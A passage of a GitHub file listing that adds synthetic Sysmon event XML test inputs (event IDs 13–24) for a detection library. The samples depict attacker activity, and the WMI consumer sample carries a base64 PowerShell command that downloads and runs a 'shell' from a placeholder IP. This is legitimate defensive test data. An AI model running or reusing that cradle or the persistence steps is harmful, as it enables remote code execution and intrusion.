    {
      "sha": "7044d4d94567cf5722c89c019ea86857c22f2d88",
      "filename": "sysmon/tests/inputs/13-RegistryValueSet.xml",
      "status": "added",
      "additions": 31,
      "deletions": 0,
      "changes": 31,
      "blob_url": "https://github.com/tenzir/library/blob/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Finputs%2F13-RegistryValueSet.xml",
      "raw_url": "https://github.com/tenzir/library/raw/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Finputs%2F13-RegistryValueSet.xml",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/sysmon%2Ftests%2Finputs%2F13-RegistryValueSet.xml?ref=2a95f0825ffa5bcf0f716d16f60c6b05a64fd317",
      "patch": "@@ -0,0 +1,31 @@\n+<!-- Sysmon EID 13 \u2013 RegistryEvent: Value Set (Schema 4.90) -->\n+<!-- Fires when a registry value is set. Details field contains the new value data. -->\n+<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n+  <System>\n+    <Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\"/>\n+    <EventID>13</EventID>\n+    <Version>2</Version>\n+    <Level>4</Level>\n+    <Task>13</Task>\n+    <Opcode>0</Opcode>\n+    <Keywords>0x8000000000000000</Keywords>\n+    <TimeCreated SystemTime=\"2025-03-22T10:23:01.000000000Z\"/>\n+    <EventRecordID>1013</EventRecordID>\n+    <Correlation/>\n+    <Execution ProcessID=\"3216\" ThreadID=\"3964\"/>\n+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>\n+    <Computer>WORKSTATION01.corp.local</Computer>\n+    <Security UserID=\"S-1-5-18\"/>\n+  </System>\n+  <EventData>\n+    <Data Name=\"RuleName\">-</Data>\n+    <Data Name=\"EventType\">SetValue</Data>\n+    <Data Name=\"UtcTime\">2025-03-22 10:23:01.000</Data>\n+    <Data Name=\"ProcessGuid\">{A23EAE89-BD56-67E0-0000-0010E9D95E03}</Data>\n+    <Data Name=\"ProcessId\">4812</Data>\n+    <Data Name=\"Image\">C:\\Users\\jdoe\\AppData\\Local\\Temp\\payload.exe</Data>\n+    <Data Name=\"TargetObject\">HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Persistence</Data>\n+    <Data Name=\"Details\">C:\\Users\\jdoe\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\persist.exe</Data>\n+    <Data Name=\"User\">CORP\\jdoe</Data>\n+  </EventData>\n+</Event>"
    },
    {
      "sha": "31b61ac36b162bd347d63e736577a17ae05496b6",
      "filename": "sysmon/tests/inputs/14-RegistryRename.xml",
      "status": "added",
      "additions": 31,
      "deletions": 0,
      "changes": 31,
      "blob_url": "https://github.com/tenzir/library/blob/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Finputs%2F14-RegistryRename.xml",
      "raw_url": "https://github.com/tenzir/library/raw/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Finputs%2F14-RegistryRename.xml",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/sysmon%2Ftests%2Finputs%2F14-RegistryRename.xml?ref=2a95f0825ffa5bcf0f716d16f60c6b05a64fd317",
      "patch": "@@ -0,0 +1,31 @@\n+<!-- Sysmon EID 14 \u2013 RegistryEvent: Key/Value Renamed (Schema 4.90) -->\n+<!-- Fires when a registry key or value is renamed. NewName contains the renamed target. -->\n+<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n+  <System>\n+    <Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\"/>\n+    <EventID>14</EventID>\n+    <Version>2</Version>\n+    <Level>4</Level>\n+    <Task>14</Task>\n+    <Opcode>0</Opcode>\n+    <Keywords>0x8000000000000000</Keywords>\n+    <TimeCreated SystemTime=\"2025-03-22T10:23:05.000000000Z\"/>\n+    <EventRecordID>1014</EventRecordID>\n+    <Correlation/>\n+    <Execution ProcessID=\"3216\" ThreadID=\"3964\"/>\n+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>\n+    <Computer>WORKSTATION01.corp.local</Computer>\n+    <Security UserID=\"S-1-5-18\"/>\n+  </System>\n+  <EventData>\n+    <Data Name=\"RuleName\">-</Data>\n+    <Data Name=\"EventType\">RenameKey</Data>\n+    <Data Name=\"UtcTime\">2025-03-22 10:23:05.000</Data>\n+    <Data Name=\"ProcessGuid\">{A23EAE89-BD56-67E0-0000-0010E9D95E03}</Data>\n+    <Data Name=\"ProcessId\">4812</Data>\n+    <Data Name=\"Image\">C:\\Users\\jdoe\\AppData\\Local\\Temp\\payload.exe</Data>\n+    <Data Name=\"TargetObject\">HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\TempKey</Data>\n+    <Data Name=\"NewName\">HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Persistence</Data>\n+    <Data Name=\"User\">CORP\\jdoe</Data>\n+  </EventData>\n+</Event>"
    },
    {
      "sha": "11f2c2c8cd33f7d1b2e1ade89c99501fb9561cf5",
      "filename": "sysmon/tests/inputs/15-FileCreateStreamHash.xml",
      "status": "added",
      "additions": 37,
      "deletions": 0,
      "changes": 37,
      "blob_url": "https://github.com/tenzir/library/blob/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Finputs%2F15-FileCreateStreamHash.xml",
      "raw_url": "https://github.com/tenzir/library/raw/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Finputs%2F15-FileCreateStreamHash.xml",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/sysmon%2Ftests%2Finputs%2F15-FileCreateStreamHash.xml?ref=2a95f0825ffa5bcf0f716d16f60c6b05a64fd317",
      "patch": "@@ -0,0 +1,37 @@\n+<!-- Sysmon EID 15 \u2013 FileCreateStreamHash (Schema 4.90) -->\n+<!-- Fires when a named alternate data stream (ADS) is created. -->\n+<!-- Classic use: Zone.Identifier stream written by browsers (Mark of the Web). -->\n+<!-- Also used by attackers to hide payloads inside ADS. -->\n+<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n+  <System>\n+    <Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\"/>\n+    <EventID>15</EventID>\n+    <Version>2</Version>\n+    <Level>4</Level>\n+    <Task>15</Task>\n+    <Opcode>0</Opcode>\n+    <Keywords>0x8000000000000000</Keywords>\n+    <TimeCreated SystemTime=\"2025-03-22T10:24:00.000000000Z\"/>\n+    <EventRecordID>1015</EventRecordID>\n+    <Correlation/>\n+    <Execution ProcessID=\"3216\" ThreadID=\"3964\"/>\n+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>\n+    <Computer>WORKSTATION01.corp.local</Computer>\n+    <Security UserID=\"S-1-5-18\"/>\n+  </System>\n+  <EventData>\n+    <Data Name=\"RuleName\">-</Data>\n+    <Data Name=\"UtcTime\">2025-03-22 10:24:00.000</Data>\n+    <Data Name=\"ProcessGuid\">{A23EAE89-BD56-67E0-0000-0010E9D95E05}</Data>\n+    <Data Name=\"ProcessId\">3108</Data>\n+    <Data Name=\"Image\">C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe</Data>\n+    <Data Name=\"TargetFilename\">C:\\Users\\jdoe\\Downloads\\invoice.exe:Zone.Identifier</Data>\n+    <Data Name=\"CreationUtcTime\">2025-03-22 10:24:00.000</Data>\n+    <Data Name=\"Hash\">SHA256=3A4B5C6D7E8F9A0B1C2D3E4F5A6B7C8D9E0F1A2B3C4D5E6F7A8B9C0D1E2F3A4B</Data>\n+    <Data Name=\"Contents\">[ZoneTransfer]\n+ZoneId=3\n+ReferrerUrl=https://phishing.example.com/\n+HostUrl=https://phishing.example.com/invoice.exe</Data>\n+    <Data Name=\"User\">CORP\\jdoe</Data>\n+  </EventData>\n+</Event>"
    },
    {
      "sha": "fab79cdef842527e77091ca35600490bd0aa0ff7",
      "filename": "sysmon/tests/inputs/16-SysmonConfigChange.xml",
      "status": "added",
      "additions": 26,
      "deletions": 0,
      "changes": 26,
      "blob_url": "https://github.com/tenzir/library/blob/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Finputs%2F16-SysmonConfigChange.xml",
      "raw_url": "https://github.com/tenzir/library/raw/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Finputs%2F16-SysmonConfigChange.xml",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/sysmon%2Ftests%2Finputs%2F16-SysmonConfigChange.xml?ref=2a95f0825ffa5bcf0f716d16f60c6b05a64fd317",
      "patch": "@@ -0,0 +1,26 @@\n+<!-- Sysmon EID 16 \u2013 SysmonConfigChange (Schema 4.90) -->\n+<!-- Fires whenever the Sysmon configuration is updated (e.g. sysmon.exe -c new_config.xml). -->\n+<!-- An unexpected config change could indicate an attacker blinding telemetry. -->\n+<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n+  <System>\n+    <Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\"/>\n+    <EventID>16</EventID>\n+    <Version>3</Version>\n+    <Level>4</Level>\n+    <Task>16</Task>\n+    <Opcode>0</Opcode>\n+    <Keywords>0x8000000000000000</Keywords>\n+    <TimeCreated SystemTime=\"2025-03-22T10:25:00.000000000Z\"/>\n+    <EventRecordID>1016</EventRecordID>\n+    <Correlation/>\n+    <Execution ProcessID=\"3216\" ThreadID=\"3964\"/>\n+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>\n+    <Computer>WORKSTATION01.corp.local</Computer>\n+    <Security UserID=\"S-1-5-18\"/>\n+  </System>\n+  <EventData>\n+    <Data Name=\"UtcTime\">2025-03-22 10:25:00.000</Data>\n+    <Data Name=\"Configuration\">C:\\Windows\\sysmon-config.xml</Data>\n+    <Data Name=\"ConfigurationFileHash\">SHA256=AABBCCDDEEFF00112233445566778899AABBCCDDEEFF00112233445566778899</Data>\n+  </EventData>\n+</Event>"
    },
    {
      "sha": "631f6b088f6d86c7d7b45c6419ec0d243d28462b",
      "filename": "sysmon/tests/inputs/17-PipeCreated.xml",
      "status": "added",
      "additions": 31,
      "deletions": 0,
      "changes": 31,
      "blob_url": "https://github.com/tenzir/library/blob/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Finputs%2F17-PipeCreated.xml",
      "raw_url": "https://github.com/tenzir/library/raw/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Finputs%2F17-PipeCreated.xml",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/sysmon%2Ftests%2Finputs%2F17-PipeCreated.xml?ref=2a95f0825ffa5bcf0f716d16f60c6b05a64fd317",
      "patch": "@@ -0,0 +1,31 @@\n+<!-- Sysmon EID 17 \u2013 PipeCreated (Schema 4.90) -->\n+<!-- Fires when a named pipe is created. Malware C2 frameworks (Cobalt Strike, Metasploit) -->\n+<!-- use named pipes for lateral movement and inter-process communication. -->\n+<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n+  <System>\n+    <Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\"/>\n+    <EventID>17</EventID>\n+    <Version>1</Version>\n+    <Level>4</Level>\n+    <Task>17</Task>\n+    <Opcode>0</Opcode>\n+    <Keywords>0x8000000000000000</Keywords>\n+    <TimeCreated SystemTime=\"2025-03-22T10:26:00.000000000Z\"/>\n+    <EventRecordID>1017</EventRecordID>\n+    <Correlation/>\n+    <Execution ProcessID=\"3216\" ThreadID=\"3964\"/>\n+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>\n+    <Computer>WORKSTATION01.corp.local</Computer>\n+    <Security UserID=\"S-1-5-18\"/>\n+  </System>\n+  <EventData>\n+    <Data Name=\"RuleName\">-</Data>\n+    <Data Name=\"EventType\">CreatePipe</Data>\n+    <Data Name=\"UtcTime\">2025-03-22 10:26:00.000</Data>\n+    <Data Name=\"ProcessGuid\">{A23EAE89-BD56-67E0-0000-0010E9D95E03}</Data>\n+    <Data Name=\"ProcessId\">4812</Data>\n+    <Data Name=\"PipeName\">\\msagent_f3a1</Data>\n+    <Data Name=\"Image\">C:\\Users\\jdoe\\AppData\\Local\\Temp\\payload.exe</Data>\n+    <Data Name=\"User\">CORP\\jdoe</Data>\n+  </EventData>\n+</Event>"
    },
    {
      "sha": "684cf4eda13015a10c52d4af69e663b23d958a26",
      "filename": "sysmon/tests/inputs/18-PipeConnected.xml",
      "status": "added",
      "additions": 30,
      "deletions": 0,
      "changes": 30,
      "blob_url": "https://github.com/tenzir/library/blob/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Finputs%2F18-PipeConnected.xml",
      "raw_url": "https://github.com/tenzir/library/raw/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Finputs%2F18-PipeConnected.xml",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/sysmon%2Ftests%2Finputs%2F18-PipeConnected.xml?ref=2a95f0825ffa5bcf0f716d16f60c6b05a64fd317",
      "patch": "@@ -0,0 +1,30 @@\n+<!-- Sysmon EID 18 \u2013 PipeConnected (Schema 4.90) -->\n+<!-- Fires when a client connects to a named pipe. Pair with EID 17 for full pipe activity. -->\n+<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n+  <System>\n+    <Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\"/>\n+    <EventID>18</EventID>\n+    <Version>1</Version>\n+    <Level>4</Level>\n+    <Task>18</Task>\n+    <Opcode>0</Opcode>\n+    <Keywords>0x8000000000000000</Keywords>\n+    <TimeCreated SystemTime=\"2025-03-22T10:26:01.000000000Z\"/>\n+    <EventRecordID>1018</EventRecordID>\n+    <Correlation/>\n+    <Execution ProcessID=\"3216\" ThreadID=\"3964\"/>\n+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>\n+    <Computer>WORKSTATION01.corp.local</Computer>\n+    <Security UserID=\"S-1-5-18\"/>\n+  </System>\n+  <EventData>\n+    <Data Name=\"RuleName\">-</Data>\n+    <Data Name=\"EventType\">ConnectPipe</Data>\n+    <Data Name=\"UtcTime\">2025-03-22 10:26:01.000</Data>\n+    <Data Name=\"ProcessGuid\">{A23EAE89-BD56-67E0-0000-0010E9D95E04}</Data>\n+    <Data Name=\"ProcessId\">6640</Data>\n+    <Data Name=\"PipeName\">\\msagent_f3a1</Data>\n+    <Data Name=\"Image\">C:\\Windows\\System32\\rundll32.exe</Data>\n+    <Data Name=\"User\">CORP\\jdoe</Data>\n+  </EventData>\n+</Event>"
    },
    {
      "sha": "374186d8d6ffd4d0efac1f29357fb402021181f0",
      "filename": "sysmon/tests/inputs/19-WmiEventFilter.xml",
      "status": "added",
      "additions": 31,
      "deletions": 0,
      "changes": 31,
      "blob_url": "https://github.com/tenzir/library/blob/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Finputs%2F19-WmiEventFilter.xml",
      "raw_url": "https://github.com/tenzir/library/raw/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Finputs%2F19-WmiEventFilter.xml",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/sysmon%2Ftests%2Finputs%2F19-WmiEventFilter.xml?ref=2a95f0825ffa5bcf0f716d16f60c6b05a64fd317",
      "patch": "@@ -0,0 +1,31 @@\n+<!-- Sysmon EID 19 \u2013 WmiEventFilter (Schema 4.90) -->\n+<!-- Fires when a WMI event filter is registered. WMI subscriptions are a persistence technique. -->\n+<!-- Operation can be: Created, Modified, Deleted -->\n+<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n+  <System>\n+    <Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\"/>\n+    <EventID>19</EventID>\n+    <Version>3</Version>\n+    <Level>4</Level>\n+    <Task>19</Task>\n+    <Opcode>0</Opcode>\n+    <Keywords>0x8000000000000000</Keywords>\n+    <TimeCreated SystemTime=\"2025-03-22T10:27:00.000000000Z\"/>\n+    <EventRecordID>1019</EventRecordID>\n+    <Correlation/>\n+    <Execution ProcessID=\"3216\" ThreadID=\"3964\"/>\n+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>\n+    <Computer>WORKSTATION01.corp.local</Computer>\n+    <Security UserID=\"S-1-5-18\"/>\n+  </System>\n+  <EventData>\n+    <Data Name=\"RuleName\">-</Data>\n+    <Data Name=\"EventType\">WmiFilterEvent</Data>\n+    <Data Name=\"UtcTime\">2025-03-22 10:27:00.000</Data>\n+    <Data Name=\"Operation\">Created</Data>\n+    <Data Name=\"User\">CORP\\jdoe</Data>\n+    <Data Name=\"EventNamespace\">root\\subscription</Data>\n+    <Data Name=\"Name\">EvilFilter</Data>\n+    <Data Name=\"Query\">SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime &gt;= 200</Data>\n+  </EventData>\n+</Event>"
    },
    {
      "sha": "4f096460dec254f7efb9392286a22dc9192f31b8",
      "filename": "sysmon/tests/inputs/20-WmiEventConsumer.xml",
      "status": "added",
      "additions": 31,
      "deletions": 0,
      "changes": 31,
      "blob_url": "https://github.com/tenzir/library/blob/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Finputs%2F20-WmiEventConsumer.xml",
      "raw_url": "https://github.com/tenzir/library/raw/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Finputs%2F20-WmiEventConsumer.xml",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/sysmon%2Ftests%2Finputs%2F20-WmiEventConsumer.xml?ref=2a95f0825ffa5bcf0f716d16f60c6b05a64fd317",
      "patch": "@@ -0,0 +1,31 @@\n+<!-- Sysmon EID 20 \u2013 WmiEventConsumer (Schema 4.90) -->\n+<!-- Fires when a WMI event consumer is registered. -->\n+<!-- Type can be: ActiveScriptEventConsumer, CommandLineEventConsumer, etc. -->\n+<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n+  <System>\n+    <Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\"/>\n+    <EventID>20</EventID>\n+    <Version>3</Version>\n+    <Level>4</Level>\n+    <Task>20</Task>\n+    <Opcode>0</Opcode>\n+    <Keywords>0x8000000000000000</Keywords>\n+    <TimeCreated SystemTime=\"2025-03-22T10:27:01.000000000Z\"/>\n+    <EventRecordID>1020</EventRecordID>\n+    <Correlation/>\n+    <Execution ProcessID=\"3216\" ThreadID=\"3964\"/>\n+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>\n+    <Computer>WORKSTATION01.corp.local</Computer>\n+    <Security UserID=\"S-1-5-18\"/>\n+  </System>\n+  <EventData>\n+    <Data Name=\"RuleName\">-</Data>\n+    <Data Name=\"EventType\">WmiConsumerEvent</Data>\n+    <Data Name=\"UtcTime\">2025-03-22 10:27:01.000</Data>\n+    <Data Name=\"Operation\">Created</Data>\n+    <Data Name=\"User\">CORP\\jdoe</Data>\n+    <Data Name=\"Name\">EvilConsumer</Data>\n+    <Data Name=\"Type\">CommandLineEventConsumer</Data>\n+    <Data Name=\"Destination\">powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAxADEALgAxADEAMQAuADEAMQAxAC4AMQAxADEALwBzAGgAZQBsAGwAJwApAA==</Data>\n+  </EventData>\n+</Event>"
    },
    {
      "sha": "6e0e0aa4e9dea98519f92dd6f777954b5bc24c9c",
      "filename": "sysmon/tests/inputs/21-WmiEventConsumerToFilter.xml",
      "status": "added",
      "additions": 30,
      "deletions": 0,
      "changes": 30,
      "blob_url": "https://github.com/tenzir/library/blob/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Finputs%2F21-WmiEventConsumerToFilter.xml",
      "raw_url": "https://github.com/tenzir/library/raw/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Finputs%2F21-WmiEventConsumerToFilter.xml",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/sysmon%2Ftests%2Finputs%2F21-WmiEventConsumerToFilter.xml?ref=2a95f0825ffa5bcf0f716d16f60c6b05a64fd317",
      "patch": "@@ -0,0 +1,30 @@\n+<!-- Sysmon EID 21 \u2013 WmiEventConsumerToFilter (Schema 4.90) -->\n+<!-- Fires when a WMI consumer is bound to a filter, completing the subscription triad. -->\n+<!-- EIDs 19+20+21 together = full WMI persistence subscription. -->\n+<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n+  <System>\n+    <Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\"/>\n+    <EventID>21</EventID>\n+    <Version>3</Version>\n+    <Level>4</Level>\n+    <Task>21</Task>\n+    <Opcode>0</Opcode>\n+    <Keywords>0x8000000000000000</Keywords>\n+    <TimeCreated SystemTime=\"2025-03-22T10:27:02.000000000Z\"/>\n+    <EventRecordID>1021</EventRecordID>\n+    <Correlation/>\n+    <Execution ProcessID=\"3216\" ThreadID=\"3964\"/>\n+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>\n+    <Computer>WORKSTATION01.corp.local</Computer>\n+    <Security UserID=\"S-1-5-18\"/>\n+  </System>\n+  <EventData>\n+    <Data Name=\"RuleName\">-</Data>\n+    <Data Name=\"EventType\">WmiBindingEvent</Data>\n+    <Data Name=\"UtcTime\">2025-03-22 10:27:02.000</Data>\n+    <Data Name=\"Operation\">Created</Data>\n+    <Data Name=\"User\">CORP\\jdoe</Data>\n+    <Data Name=\"Consumer\">CommandLineEventConsumer.Name=\"EvilConsumer\"</Data>\n+    <Data Name=\"Filter\">__EventFilter.Name=\"EvilFilter\"</Data>\n+  </EventData>\n+</Event>"
    },
    {
      "sha": "52714035ed1c75381dc01eb680a4e13f0e5a6318",
      "filename": "sysmon/tests/inputs/22-DnsQuery.xml",
      "status": "added",
      "additions": 33,
      "deletions": 0,
      "changes": 33,
      "blob_url": "https://github.com/tenzir/library/blob/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Finputs%2F22-DnsQuery.xml",
      "raw_url": "https://github.com/tenzir/library/raw/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Finputs%2F22-DnsQuery.xml",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/sysmon%2Ftests%2Finputs%2F22-DnsQuery.xml?ref=2a95f0825ffa5bcf0f716d16f60c6b05a64fd317",
      "patch": "@@ -0,0 +1,33 @@\n+<!-- Sysmon EID 22 \u2013 DNSEvent (Schema 4.90) -->\n+<!-- Logs DNS queries made by processes. Useful for detecting C2 beaconing and DGA domains. -->\n+<!-- QueryStatus 0 = success; other values are Win32 DNS error codes. -->\n+<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n+  <System>\n+    <Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\"/>\n+    <EventID>22</EventID>\n+    <Version>5</Version>\n+    <Level>4</Level>\n+    <Task>22</Task>\n+    <Opcode>0</Opcode>\n+    <Keywords>0x8000000000000000</Keywords>\n+    <TimeCreated SystemTime=\"2025-03-22T10:28:00.000000000Z\"/>\n+    <EventRecordID>1022</EventRecordID>\n+    <Correlation/>\n+    <Execution ProcessID=\"3216\" ThreadID=\"3964\"/>\n+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>\n+    <Computer>WORKSTATION01.corp.local</Computer>\n+    <Security UserID=\"S-1-5-18\"/>\n+  </System>\n+  <EventData>\n+    <Data Name=\"RuleName\">-</Data>\n+    <Data Name=\"UtcTime\">2025-03-22 10:28:00.000</Data>\n+    <Data Name=\"ProcessGuid\">{A23EAE89-BD56-67E0-0000-0010E9D95E03}</Data>\n+    <Data Name=\"ProcessId\">4812</Data>\n+    <Data Name=\"QueryName\">c2.xn--q9jyb4c.tld</Data>\n+    <Data Name=\"QueryStatus\">0</Data>\n+    <Data Name=\"Initiated\">true</Data>\n+    <Data Name=\"QueryResults\">type:  5 cdn.xn--q9jyb4c.tld;::ffff:185.220.101.47;</Data>\n+    <Data Name=\"Image\">C:\\Users\\jdoe\\AppData\\Local\\Temp\\payload.exe</Data>\n+    <Data Name=\"User\">CORP\\jdoe</Data>\n+  </EventData>\n+</Event>"
    },
    {
      "sha": "dc6e18f62cd5323f00aafe30cfd8d272b0ddf2f4",
      "filename": "sysmon/tests/inputs/23-FileDelete.xml",
      "status": "added",
      "additions": 34,
      "deletions": 0,
      "changes": 34,
      "blob_url": "https://github.com/tenzir/library/blob/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Finputs%2F23-FileDelete.xml",
      "raw_url": "https://github.com/tenzir/library/raw/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Finputs%2F23-FileDelete.xml",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/sysmon%2Ftests%2Finputs%2F23-FileDelete.xml?ref=2a95f0825ffa5bcf0f716d16f60c6b05a64fd317",
      "patch": "@@ -0,0 +1,34 @@\n+<!-- Sysmon EID 23 \u2013 FileDelete (Archived) (Schema 4.90) -->\n+<!-- Fires when a file is deleted AND archives a copy to the Sysmon ArchiveDirectory. -->\n+<!-- Archived=true means a copy was saved; useful for recovering deleted malware. -->\n+<!-- For detection-only (no archiving), see EID 26. -->\n+<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n+  <System>\n+    <Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\"/>\n+    <EventID>23</EventID>\n+    <Version>5</Version>\n+    <Level>4</Level>\n+    <Task>23</Task>\n+    <Opcode>0</Opcode>\n+    <Keywords>0x8000000000000000</Keywords>\n+    <TimeCreated SystemTime=\"2025-03-22T10:29:00.000000000Z\"/>\n+    <EventRecordID>1023</EventRecordID>\n+    <Correlation/>\n+    <Execution ProcessID=\"3216\" ThreadID=\"3964\"/>\n+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>\n+    <Computer>WORKSTATION01.corp.local</Computer>\n+    <Security UserID=\"S-1-5-18\"/>\n+  </System>\n+  <EventData>\n+    <Data Name=\"RuleName\">-</Data>\n+    <Data Name=\"UtcTime\">2025-03-22 10:29:00.000</Data>\n+    <Data Name=\"ProcessGuid\">{A23EAE89-BD56-67E0-0000-0010E9D95E03}</Data>\n+    <Data Name=\"ProcessId\">4812</Data>\n+    <Data Name=\"User\">CORP\\jdoe</Data>\n+    <Data Name=\"Image\">C:\\Users\\jdoe\\AppData\\Local\\Temp\\payload.exe</Data>\n+    <Data Name=\"TargetFilename\">C:\\Users\\jdoe\\AppData\\Local\\Temp\\dropper_stage1.exe</Data>\n+    <Data Name=\"Hashes\">SHA1=AABB1122...,MD5=CCDD3344...,SHA256=EEFF5566...,IMPHASH=77889900...</Data>\n+    <Data Name=\"IsExecutable\">true</Data>\n+    <Data Name=\"Archived\">true</Data>\n+  </EventData>\n+</Event>"
    },
    {
      "sha": "2a3ea9555e60f08ea9c19dca1c1ae4108784005d",
      "filename": "sysmon/tests/inputs/24-ClipboardChange.xml",
      "status": "added",
      "additions": 33,
      "deletions": 0,
      "changes": 33,
      "blob_url": "https://github.com/tenzir/library/blob/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Finputs%2F24-ClipboardChange.xml",
      "raw_url": "https://github.com/tenzir/library/raw/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Finputs%2F24-ClipboardChange.xml",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/sysmon%2Ftests%2Finputs%2F24-ClipboardChange.xml?ref=2a95f0825ffa5bcf0f716d16f60c6b05a64fd317",
      "patch": "@@ -0,0 +1,33 @@\n+<!-- Sysmon EID 24 \u2013 ClipboardChange (Schema 4.90) -->\n+<!-- Fires when clipboard contents change. Can detect credential harvesting via clipboard. -->\n+<!-- Archived field indicates whether the clipboard content was saved to ArchiveDirectory. -->\n+<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n+  <System>\n+    <Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\"/>\n+    <EventID>24</EventID>\n+    <Version>5</Version>\n+    <Level>4</Level>\n+    <Task>24</Task>\n+    <Opcode>0</Opcode>\n+    <Keywords>0x8000000000000000</Keywords>\n+    <TimeCreated SystemTime=\"2025-03-22T10:30:00.000000000Z\"/>\n+    <EventRecordID>1024</EventRecordID>\n+    <Correlation/>\n+    <Execution ProcessID=\"3216\" ThreadID=\"3964\"/>\n+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>\n+    <Computer>WORKSTATION01.corp.local</Computer>\n+    <Security 